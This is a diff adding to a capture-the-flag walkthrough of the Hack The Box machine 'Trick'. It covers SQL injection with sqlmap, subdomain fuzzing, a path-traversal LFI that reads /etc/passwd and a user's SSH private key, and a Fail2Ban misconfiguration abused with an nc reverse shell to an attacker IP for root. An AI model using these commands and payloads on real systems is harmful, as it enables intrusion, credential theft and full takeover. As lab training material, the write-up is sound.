@@ -80,7 +80,7 @@ We can see that we are in a login page.
 I run a scan with BurpSuite and it found a SQL Injection!
 
 ![Alt text](./Trick/Burp.png?raw=true "Web Page")
-## **4. Check for SQL Injection**
+## **5. Check for SQL Injection**
 
 Let's try to use a random usernale and password (admin/admin) to check the errors, if any.
 
@@ -138,4 +138,140 @@ Let's see what's inside the **users** table, replacing **--tables** with **-T us
 └─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' -D payroll_db -T users --dump
 
 ```
+We got a username and password:
+
+![Alt text](./Trick/trick_sqlmap_user.png?raw=true "Web Page")
+
+Let's Use it to Login!!
+
+![Alt text](./Trick/preprod-payroll.trick.htb.login.png?raw=true "Web Page")
+
+After some time trying to enumerate the system, with no progress, I tried to enumerate the subdomains.
+
+## **6. Subdomains enumaration**
+
+No success until I decide to append the **preprod-** to my enumeration adding **-hh 5480** to exclude the response with different characters than 5480:
+
+```
+└─# wfuzz -c -t 400 --hh 5480  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -H "Host: preprod-FUZZ.trick.htb" http://trick.htb 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://trick.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+
+000000254:   200        178 L    631 W      9660 Ch     "marketing"                                                                                                                                                                
+
+Total time: 23.60920
+Processed Requests: 4989
+Filtered Requests: 4988
+Requests/sec.: 211.3158
+
+```
+
+Let's check what is inside, but we have to add it to our **/etc/hosts**
+
+![Alt text](./Trick/preprod-marketing.trick.htb.png?raw=true "Web Page")
+
+Navigating trough the web page, I noted that clicking on **Services** as well as in the other menu items, the url uses the **page** parameter that load other pages.
+
+**http://preprod-marketing.trick.htb/index.php?page=services.html**
+
+
+## **7. Local File Inclusion**
+
+Let's try to check if the system is vulnerable:
+
+**http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././..././..././..././etc/passwd**
+
+**The system is vulnerable!!!**
+
+We can see that there is a local user **michael** with the home direcory **/home/michael**
+
+Let's try to see if there is a private key in the **.ssh** folder
+
+**http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././..././..././..././/home/michael/.ssh/id_rsa**
+
+## **8. Connect using ssh**
+
+We have it!!! We can now use it to connect via ssh.
+
+1. Copy the private key and paste into a new file called **trickssh**
+2. Change the file permissions to 600
+3. Connect using **ssh -i trickssh michael@trick.htb**
+
+```
+└─# ssh -i trickssh michael@trick.htb
+Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+michael@trick:~$ 
+```
+## **9. Privilege Escalation**
+
+Once connected, let's see if michael is part of the sudoers:
+
+```
+michael@trick:~$ sudo -l
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+michael@trick:~$ 
+
+```
+
+We can see the we can run without adding the password **/etc/init.d/fail2ban restart**
+
+## **10. Fail2Ban exploit missconfiguration**
+
+After some searches I found those 2 articles:
+- https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49
+- https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7
+
+Following what stated there i did the following steps:
+1. copy the **/etc/fail2ban/action.d/iptables-multiport.conf** in michael home
+2. modify the coupied file as follow:
+```
+# Option:  actionban
+# Notes.:  command executed when banning an IP. Take care that the
+#          command is executed with Fail2Ban user rights.
+# Tags:    See jail.conf(5) man page
+# Values:  CMD
+#
+actionban = /usr/bin/nc 10.10.14.20 9999 -e /usr/bin/bash
+
+```
+3. moved back the file to its original location
+```
+michael@trick:~$ mv iptables-multiport.conf /etc/fail2ban/action.d/.
+mv: replace '/etc/fail2ban/action.d/./iptables-multiport.conf', overriding mode 0644 (rw-r--r--)? y
+
+```
+4. run **sudo /etc/init.d/fail2ban restart**
+5. On a new terminal, run **nc -lvp 9999**
+
+When you will get ban from running ssh actionban will execute and you will get reverse shell as root.
+
+To force it, just try to connect ssh with a user lambda.
+
+HERE WE ARE!!!!
+
+![Alt text](./Trick/root.png?raw=true "Web Page")
+
+
+HOPE YOU ENJOYED!!!
+
 
